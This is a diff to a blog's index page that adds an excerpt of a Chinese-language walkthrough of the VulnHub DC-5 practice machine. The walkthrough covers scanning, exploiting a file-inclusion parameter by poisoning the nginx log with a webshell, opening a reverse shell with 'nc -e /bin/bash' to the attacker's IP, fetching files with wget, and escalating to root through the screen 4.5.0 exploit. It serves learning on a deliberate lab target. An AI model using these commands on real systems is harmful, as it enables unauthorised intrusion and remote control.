@@ -161,6 +161,121 @@
     <div class="cube-content">
         <div class="cube-left">
             
+<div class="cube-excerpt" id="cube-excerpt-DC5-Try">
+    <header class="cube-excerpt-header">
+        <h1><a href="/2024/07/28/DC5-Try/">DC5-Try</a></h1>
+        <div class="cube-excerpt-header-msg">
+            <div class="cube-excerpt-date">
+                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+                2024-07-28
+            </div>
+            <div class="cube-excerpt-tags">
+                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+                
+            </div>
+        </div>
+    </header>
+    <article class="cube-excerpt-entry cube-markdown">
+        
+        
+           <h1 id="1dc-5靶机下载"><a href="#1dc-5靶机下载" class="headerlink" title="1dc-5靶机下载"></a>1dc-5靶机下载</h1><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-5.zip">https://download.vulnhub.com/dc/DC-5.zip</a></p>
+<h1 id="2信息收集"><a href="#2信息收集" class="headerlink" title="2信息收集"></a>2信息收集</h1><p>（1）收集ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -sP 192.168.49.0/24</span><br><span class="line">又学了一个扫描命令</span><br><span class="line">netdiscover    从头开始扫描，比较全</span><br></pre></td></tr></table></figure>
+
+<p>看到134</p>
+<p>（2）扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -A -n 192.168.49.134</span><br></pre></td></tr></table></figure>
+
+<p>看到80，111端口，其他的没看到</p>
+<p>又学到了一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln =p80,111 192.168.49.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/28/DC5-Try/1.png" alt="DC5-Try"></p>
+<p>这个是扫端口有没有漏洞，用的是nmap的漏洞库    这个没发现漏洞</p>
+<p>访问网站</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb url</span><br></pre></td></tr></table></figure>
+
+<p>目录没啥东西</p>
+<p>点那个contact填一下</p>
+<p>下面还变了2019会变成其他的</p>
+<p>get  可能是文件包含</p>
+<p><img src="/2024/07/28/DC5-Try/2.png" alt="DC5-Try"></p>
+<p>爆一下参数</p>
+<p><img src="/2024/07/28/DC5-Try/3.png" alt="DC5-Try"></p>
+<p>爆出来参数 file</p>
+<p><img src="/2024/07/28/DC5-Try/4.png" alt="DC5-Try"></p>
+<p>看出来是nginx</p>
+<p>看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /thankyou.php?file=/etc/nginx/nginx.conf </span><br></pre></td></tr></table></figure>
+
+<p>看一下配置文件</p>
+<p>有两个日志文件</p>
+<p>access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;<br>    error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</p>
+<p><img src="/2024/07/28/DC5-Try/5.png" alt="DC5-Try"></p>
+<p>看到我爆参数的在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log; 里面</p>
+<p>那写一个一句话木马</p>
+<p><img src="C:\Users\86139\AppData\Roaming\Typora\typora-user-images\image-20240728174544196.png" alt="image-20240728174544196"></p>
+<p><img src="/2024/07/28/DC5-Try/6.png" alt="DC5-Try"></p>
+<p>蚁剑连接</p>
+<p><img src="/2024/07/28/DC5-Try/7.png" alt="DC5-Try"></p>
+<p>在kali上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvnp 6666</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/28/DC5-Try/8.png" alt="DC5-Try"></p>
+<p>蚁剑终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.49.129 6666</span><br></pre></td></tr></table></figure>
+
+<p>开启交互模式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami/id   看到权限比较低</span><br><span class="line">知道要提权</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root =perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>看到</p>
+<p>screen-4.5.0</p>
+<p>搜</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+
+<p>记得4前不要加-</p>
+<p>一个sh</p>
+<p>一个txt</p>
+<p>txt没权限</p>
+<p>运行sh，可以gcc不行</p>
+<p>啊这</p>
+<p><img src="/2024/07/28/DC5-Try/8.png" alt="DC5-Try"></p>
+<p>分成这三部分</p>
+<p><img src="/2024/07/28/DC5-Try/9.png" alt="DC5-Try"></p>
+<p>先在本地编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">vim libhax.c</span><br><span class="line"> gcc -fPIC -shared -ldl -o libhax.so libhax.c   </span><br><span class="line"> 这个是脚本里的命令</span><br><span class="line"> vim rootshell.c</span><br><span class="line"> gcc -o rootshell rootshell.c</span><br><span class="line"> vim dc5.sh</span><br><span class="line"> 注意除了上面的标头</span><br><span class="line"> #！/bin/bash</span><br><span class="line"> </span><br><span class="line"> esc</span><br><span class="line"> ：set ff=unix</span><br><span class="line"> 再保存:wq</span><br></pre></td></tr></table></figure>
+
+<p>开启http</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+
+<p>shell连上的机子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd /tmp</span><br><span class="line">wget http://ip:8888/文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 dc5.sh</span><br><span class="line">./dc5.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是报错</p>
+<p><img src="/2024/07/28/DC5-Try/10.png" alt="DC5-Try"></p>
+<p>这个是gcc版本不同啊gg</p>
+<p>我重开一个dc机  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c  在靶机运行</span><br></pre></td></tr></table></figure>
+
+<p>但是 不太行，这个rootshell删不掉</p>
+<p>那这几个要重命名</p>
+<p>记得这个c语言脚本的名字都要改</p>
+<p>运行即可</p>
+<p><img src="/2024/07/28/DC5-Try/11.png" alt="DC5-Try"></p>
+
+        
+    </article>
+    <footer class="cube-excerpt-footer">
+        <a class="cube-excerpt-more" href="/2024/07/28/DC5-Try/">Read More</a>
+    </footer>
+</div>
+
 <div class="cube-excerpt" id="cube-excerpt-DC4-Try">
     <header class="cube-excerpt-header">
         <h1><a href="/2024/07/27/DC4-Try/">DC4-Try</a></h1>
@@ -433,31 +548,6 @@
     </footer>
 </div>
 
-<div class="cube-excerpt" id="cube-excerpt-1">
-    <header class="cube-excerpt-header">
-        <h1><a href="/2024/04/14/1/">1</a></h1>
-        <div class="cube-excerpt-header-msg">
-            <div class="cube-excerpt-date">
-                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
-                2024-04-14
-            </div>
-            <div class="cube-excerpt-tags">
-                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
-                
-            </div>
-        </div>
-    </header>
-    <article class="cube-excerpt-entry cube-markdown">
-        
-        
-           
-        
-    </article>
-    <footer class="cube-excerpt-footer">
-        <a class="cube-excerpt-more" href="/2024/04/14/1/">Read More</a>
-    </footer>
-</div>
-
 
 
 <ul class="cube-pagination cube-pagination-6">
@@ -527,7 +617,7 @@
     
     
     <div class="count">
-        <a class="count articles"><span>11</span>Article</a>
+        <a class="count articles"><span>12</span>Article</a>
         <a class="count tags"><span>0</span>Tags</a>
         <a class="count categories"><span>0</span>Categories</a>
     </div>
@@ -566,7 +656,7 @@
                     <span>1</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/27/DC4-Try/" title="DC4-Try">DC4-Try</a>
+                    <a href="/2024/07/28/DC5-Try/" title="DC5-Try">DC5-Try</a>
                 </p>
             </div>
             
@@ -580,7 +670,7 @@
                     <span>2</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/26/DC3-2Try/" title="DC3-2Try">DC3-2Try</a>
+                    <a href="/2024/07/27/DC4-Try/" title="DC4-Try">DC4-Try</a>
                 </p>
             </div>
         </li>
@@ -593,7 +683,7 @@
                     <span>3</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/26/DC-2Try/" title="DC-2Try">DC-2Try</a>
+                    <a href="/2024/07/26/DC3-2Try/" title="DC3-2Try">DC3-2Try</a>
                 </p>
             </div>
         </li>
@@ -606,7 +696,7 @@
                     <span>4</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/25/DC1Try/" title="DC1Try">DC1Try</a>
+                    <a href="/2024/07/26/DC-2Try/" title="DC-2Try">DC-2Try</a>
                 </p>
             </div>
         </li>
@@ -619,7 +709,7 @@
                     <span>5</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/08/ciscn-sanic-py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="ciscn sanic py原型链污染">ciscn sanic py原型链污染</a>
+                    <a href="/2024/07/25/DC1Try/" title="DC1Try">DC1Try</a>
                 </p>
             </div>
         </li>
